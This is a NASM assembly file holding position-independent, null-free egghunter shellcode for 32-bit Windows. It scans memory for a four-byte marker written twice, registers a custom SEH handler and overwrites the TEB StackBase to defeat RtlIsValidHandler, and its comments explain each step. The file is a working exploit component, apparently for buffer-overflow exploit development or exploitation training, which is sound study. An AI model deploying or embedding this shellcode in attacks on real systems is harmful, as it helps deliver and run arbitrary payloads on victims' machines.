; position independent non-NULL egghunter shellcode using SEH
;
; NOTE example to generate new egg value as 'lolz': 
;      python3 -c "print('0x'+'lolz'.encode()[::-1].hex())"  
BITS 32
section .text
global _start

; dt ntdll!_NT_TIB
;   +0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD
;   +0x004 StackBase     : Ptr32 Void
;   +0x008 StackLimit    : Ptr32 Void
;   ...

; dt ntdll!_CONTEXT
;   ...
;   +0x0b8 Eip : Uint4B
;   ...

_start:
  mov   eax, 0x7a6c6f6c      ; set the egg (currently 'lolz')
  jmp   get_handler_address  ; jump to get SEH handler address dynamically (PIC)
install_handler:
  pop   ecx                  ; pull the address of the SEH handler off the stack 
  push  ecx                  ; push _EXCEPTION_REGISTRATION_RECORD.Handler on the stack
  push  0xffffffff           ; push _EXCEPTION_REGISTRATION_RECORD.Next = -1 on the stack
  xor   ebx, ebx             ; NULL out ebx (will also be our starting search address)
  mov   [fs:ebx], esp        ; install our _EXCEPTION_REGISTRATION_RECORD into the TEB.ExceptionList (see definition above)
  sub   ecx, 0x04            ; place the memory address of our _except_handler function at a higher address than the StackBase
  mov   [fs:ebx + 0x04], ecx ; overwrite the StackBase in the TEB to bypass RtlIsValidHandler's StackBase check
  or    bx, 0xfff            ; if page is invalid, exception_handler will update eip to point here and we move to the next page
check_for_egg:
  inc   ebx                  ; increment the test pointer by one
  push  0x02                 ; get the byte 0x2 on the stack
  pop   ecx                  ; get the byte 0x2 in ecx to know how many times to run "scasd" with "repe"
  mov   edi, ebx             ; set edi to the pointer we validated
  repe  scasd                ; compare the dword in edi to eax
  jnz   check_for_egg        ; jump to the begining of the egg test loop
  jmp   edi                  ; found the egg. jump 8 bytes past it into our code.

; typedef EXCEPTION_DISPOSITION _except_handler ( 
;   IN PEXCEPTION_RECORD ExceptionRecord,
;   IN VOID EstablisherFrame,
;   IN OUT PCONTEXT ContextRecord,
;   IN OUT PDISPATCHER_CONTEXT DispatcherContext
; );
get_handler_address:
  call  install_handler         ; push _EXCEPTION_REGISTRATION_RECORD.Handler (start of our SEH handler) on the stack
  mov   eax, [esp + 0x0c]       ; get the value of the ContextRecord argument off the stack and into eax
  xor   ecx, ecx                ; NULL ecx
  mov   cl, 0xb8                ; get offset of CONTEXT->Eip into ecx (see definition above)
  sub   dword [eax + ecx], 0x0b ; subtract the value of eip by 0x0b in CONTEXT so it points to "or bx, 0xfff" above
  xor   eax, eax                ; NULL eax to simulate ExceptionContinueExecution return value from handler
  ret                           ; return from exception handler

